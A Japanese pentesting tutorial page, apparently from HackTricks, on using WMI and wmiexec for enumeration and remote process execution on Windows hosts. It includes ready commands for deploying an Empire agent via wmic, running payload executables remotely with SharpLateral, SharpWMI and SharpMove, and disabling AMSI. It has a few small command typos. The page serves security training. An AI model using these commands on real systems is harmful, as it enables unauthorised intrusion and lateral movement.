# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## 仕組みの説明

WMIを使用すると、ユーザー名とパスワードまたはハッシュのいずれかが既知であるホスト上で、プロセスを起動できます。WmiexecはWMIを使用してコマンドを実行し、semi-interactive shellのような操作環境を提供します。

**dcomexec.py:** このスクリプトは、異なるDCOMエンドポイントを利用して、wmiexec.pyに似たsemi-interactive shellを提供します。具体的には、ShellBrowserWindow DCOM objectを利用します。現在、MMC20.Application、Shell Windows、Shell Browser Window objectsをサポートしています。(source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>

## WMIの基礎

### Namespace

ディレクトリ形式の階層構造で編成されており、WMIの最上位コンテナは\rootです。その配下には、namespaceと呼ばれる追加のディレクトリが整理されています。<sup>[[1]](#references)</sup>
Namespaceを一覧表示するコマンド:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
namespace 内のクラスは、次の方法で一覧表示できます:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **クラス**

`win32_process` などの WMI クラス名と、そのクラスが存在する namespace を把握することは、あらゆる WMI 操作に不可欠です。  
`win32` で始まるクラスを一覧表示するコマンド：
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
クラスの呼び出し:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### メソッド

WMI クラスの 1 つ以上の実行可能な関数であるメソッドを実行できます。
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Service Status

WMI service が稼働しているか確認するための Commands:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### System と Process Information

WMI を通じた system および process information の収集：
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
攻撃者にとって、WMIはシステムやドメインに関する機密データを列挙するための強力なツールです。<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
特定の情報（ローカル管理者やログオン中のユーザーなど）を取得するための WMI のリモートクエリは、コマンドを慎重に構築すれば実行可能です。

### **手動によるリモート WMI クエリ**

特定の WMI クエリを使用することで、リモートマシン上のローカル管理者やログオン中のユーザーをステルスに特定できます。`wmic` はテキストファイルから読み込んで、複数のノード上で同時にコマンドを実行することもサポートしています。<sup>[[1]](#references)</sup>

Empire agent のデプロイなど、WMI 経由でプロセスをリモート実行するには、次のコマンド構造を使用します。実行が成功すると、戻り値として "0" が返されます。<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
このプロセスは、WMIのリモート実行およびシステム列挙の機能を示しており、システム管理とpentestingの両方における有用性を強調しています。

## Automatic Tools

- [**SharpLateral**](https://github.com/mertdas/SharpLateral)：
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacketの `wmiexec`** も使用できます。


## 参考資料

- [1] [Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Beginner's Guide to Impacket Tool Kit - Part 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)


{{#include ../../banners/hacktricks-training.md}}
